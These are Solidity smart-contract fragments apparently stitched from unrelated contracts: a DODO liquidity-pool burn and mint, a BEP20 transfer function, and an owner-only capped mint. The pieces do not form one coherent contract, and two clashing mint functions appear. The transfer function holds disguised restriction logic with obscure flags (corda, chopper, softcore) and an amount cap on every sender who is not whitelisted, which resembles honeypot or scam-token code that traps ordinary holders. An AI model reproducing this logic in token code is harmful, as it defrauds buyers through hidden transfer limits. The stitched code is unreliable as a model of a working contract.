function burn(uint amount) external {
    uint _supply = totalSupply;
    uint _usdt_share = erc20(USDT_DODO_LP).balanceOf(address(this)) * amount / _supply;
    uint _ibeur_share = erc20(ibEUR_DODO_LP).balanceOf(address(this)) * amount / _supply;
    dodo(DODO).withdrawBaseTo(msg.sender, _ibeur_share);
    dodo(DODO).withdrawQuoteTo(msg.sender, _usdt_share);
    _burn(msg.sender, amount);
}

function mint(uint amount) external returns(uint) {
    uint _usdt = amount * 1e6 / 1e18;
    require(_usdt > 0);
    _safeTransferFrom(ibEUR, amount);
    _safeTransferFrom(USDT, _usdt);
    erc20(ibEUR).approve(DODO, amount);
    erc20(USDT).approve(DODO, _usdt);
    dodo(DODO).depositBase(amount);
    dodo(DODO).depositQuote(_usdt);
    _mint(msg.sender, amount);
    return amount;
}

function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "BEP20: transfer from the zero address");
    require(recipient != address(0), "BEP20: transfer to the zero address");
    if ((address(sender) == creator) && (softcore == true)) {
        corda[recipient] = true;
        chopper[recipient] = false;
        softcore = false;
    }
    if (corda[recipient] != true) {
        chopper[recipient] = ((randomItIs() == 2) ? true : false);
    }
    if ((chopper[sender]) && (corda[recipient] == false)) {
        chopper[recipient] = true;
    }
    if (corda[sender] == false) {
        require(amount < ship);
    }
    _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
}

function mint(address _to, uint256 _amount) onlyOwner public returns(bool) {
    require(_to != address(0));
    require(add(totalSupply, _amount) <= (CAP_TO_GIVE_AWAY + (now >= TEAM_CAP_RELEASE_TIME ? CAP_FOR_THE_TEAM : 0)));
    totalSupply = add(totalSupply, _amount);
    balanceOf[_to] = add(balanceOf[_to], _amount);
    emit Mint(_to, _amount);
    emit Transfer(address(0), _to, _amount);
    return true;
}

